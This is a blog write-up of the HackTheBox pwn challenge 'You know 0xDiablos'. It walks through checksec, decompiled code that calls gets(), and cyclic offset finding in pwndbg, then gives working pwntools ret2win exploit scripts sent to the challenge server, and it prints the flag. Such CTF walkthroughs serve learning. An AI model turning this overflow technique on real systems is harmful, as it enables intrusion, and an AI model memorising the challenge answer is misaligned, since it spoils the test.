---
title: "[HTB] You know 0xDiablos Writeup"
cover: >-
    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png
categories:
    - - HackTheBox
    - - CTF
tags:
    - HTB
    - Pwn
    - HackTheBox
abbrlink: ca279614
date: 2024-07-31 15:52:37
---

# 0x00 Challenge Info

As usual, let's see the challenge desciption first.

> I missed my flag

It's a really simple description lol. Let's directly dive into the analyzation part.

# 0x01 Reconnaissance

## Checksec

```bash
┌──(kali㉿kali)-[~/CTF/HTB/You know 0xDiablos]
└─$ pwn checksec vuln
[*] '/home/kali/CTF/HTB/You know 0xDiablos/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

All protecitons are off.

## Decompile

Main function of this binary.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-Ch]

  setvbuf(stdout, 0, 2, 0);
  v4 = getegid();
  setresgid(v4, v4, v4);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```

The `vuln()` seems interesting, let's check what it does.

```c
int vuln()
{
  char INPUT[180]; // [esp+0h] [ebp-B8h] BYREF

  gets(INPUT);
  return puts(INPUT);
}
```

It allocates a memory space of 180 bytes and use `gets()` to ask for the input. As everybody knows, the `gets()` function is regarded as a super dangerous funtion, and the vulnerability of this challenge will happen here.

Besides this, you can notice that there's still a cool function called `flag()`. Let's see the code below.

```c
char *__cdecl flag(int a1, int a2)
{
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Hurry up and try in on server side.");
    exit(0);
  }
  result = fgets(s, 64, stream);
  if ( a1 == 0xDEADBEEF && a2 == 0xC0DED00D )
    return (char *)printf(s);
  return result;
}
```

It reads the flag.txt file and outputs its contents as long as the condition is met, which is to make `a1` equals to `0xDEADBEEF` and `a2` equals to `0xC0DED00D`.

At this point, we can probably know that this challenge is a **ret2win** problem, so we should find the offset and the address of the function we want to execute.

## Get Offset

```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> r
Starting program: /home/kali/CTF/HTB/You know 0xDiablos/vuln
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You know who are 0xDiablos:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────
*EAX  0xc9
*EBX  0x62616175 ('uaab')
*ECX  0xf7e258a0 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049330 (__libc_csu_init) ◂— push ebp
*EBP  0x62616176 ('vaab')
*ESP  0xffffcfb0 ◂— 'xaabyaab'
*EIP  0x62616177 ('waab')
───────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────
Invalid address 0x62616177
────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcfb0 ◂— 'xaabyaab'
01:0004│     0xffffcfb4 ◂— 'yaab'
02:0008│     0xffffcfb8 —▸ 0xf7fc2400 ◂— 'gnu/libc.so.6'
03:000c│     0xffffcfbc ◂— 0x3e8
04:0010│     0xffffcfc0 —▸ 0xffffcfe0 ◂— 0x1
05:0014│     0xffffcfc4 —▸ 0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* ',="' */
06:0018│     0xffffcfc8 ◂— 0x0
07:001c│     0xffffcfcc —▸ 0xf7c23c65 (__libc_start_call_main+117) ◂— add esp, 0x10
──────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────
 ► 0 0x62616177
   1 0x62616178
   2 0x62616179
   3 0xf7fc2400
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

-   `EIP`

```bash
pwndbg> cyclic -l waab
Finding cyclic pattern of 4 bytes: b'waab' (hex: 0x77616162)
Found at offset 188
```

-   `ESP`

```bash
pwndbg> cyclic -l xaab
Finding cyclic pattern of 4 bytes: b'xaab' (hex: 0x78616162)
Found at offset 192
```

# 0x02 Exploit

Since we know that the offset to control the `EIP` is 188, we can build our exploit! Here's the step.

1. Overflow and overwrite the `EIP` to the address of `flag()`.
2. Concat the ROP Chain with the value of a1 and a1, which is 0xDEADBEEF and 0xC0DED00D.
3. Pwned.

```txt
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C stream          dd ?                    ; offset
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004 var_4           dd ?
+0000000000000000  s              db 4 dup(?)
+0000000000000004  r              db 4 dup(?)
+0000000000000008 arg_0           dd ?
+000000000000000C arg_4           dd ?
+0000000000000010
+0000000000000010 ; end of stack variables
```

By this stack frame view of `flag()` from IDA, we can see that when we overflow the `var_4` and `s`, we can get to the `r`, which is the return address. Furthermore, once we overflow the return address, it comes to `arg_0` & `arg_4`, which are a1 & a2. So I write the exploit like this.

```python
from pwn import *

offset = 188
flag_addr = 0x080491E2
payload = b"A" * offset + p32(flag_addr) + p32(0xDEADBEEF) + p32(0xC0DED00D)

r = remote("94.237.53.53", 56739)
r.sendline(payload)
r.interactive()
```

But this didn't work. It got EOF and didn't receive the flag. After searching on the web, I found [this article](https://github.com/jojoCode123/IosifOS/blob/master/hackthebox/challenges/pwn/you-know-0xdiablos.md) somehow explain the issue here. Although I cannot 100% understand the thing in this article, I still find the issue using my own way (if something wrong please tell me in the comments thx).

If we set the ROP chain like `b"A" * offset + p32(flag_addr) + p32(0xDEADBEEF) + p32(0xC0DED00D)`, the `0xDEADBEEF` won't be the value of `a1`, instead, it will be filled in the `ESP`. For example, I use cyclic 300 to create the pattern and check the value of the registers.

```bash
─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────
*EAX  0x12d
*EBX  0x62616175 ('uaab')
*ECX  0xf7e258a0 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049330 (__libc_csu_init) ◂— push ebp
*EBP  0x62616176 ('vaab')
*ESP  0xffffcfb0 ◂— 'xaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
*EIP  0x62616177 ('waab')
───────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────
```

As you can see, the "xaab" is right after the "waab", but here the "xaab" isn't the value of `a1`. That's because when a function is called (like flag() in this case), the current return address is pushed onto the stack so that the program can return after executing the function. So we need to cover that return address. Since it's a 32-bit ELF, I use `p32()`. By doing so, the `EIP` will pointing to this address we cover. But the thing inside the `p32` can be anything though since it's just a placeholder to make sure the program won't crash. Here's the finall exploit.

```python
from pwn import *

offset = 188
flag_addr = 0x080491E2
payload = b"A" * offset + p32(flag_addr) + p32(1337) + p32(0xDEADBEEF) + p32(0xC0DED00D)

r = remote("94.237.53.53", 56739)
r.sendline(payload)
r.interactive()
```

# 0x03 Pwned

```txt
HTB{0ur_Buff3r_1s_not_healthy}
```

Although I found the flag, I searched for a lot of writeups during the challenge. And I don't think I totally understand the whole concept of this challenge, probably just about 80% only. I'll keep leaning new stuff and reviewing things I learned, hope one day I can entirely understand this challenge. And that day, I will be back here and try to fix everything wrong in this article.
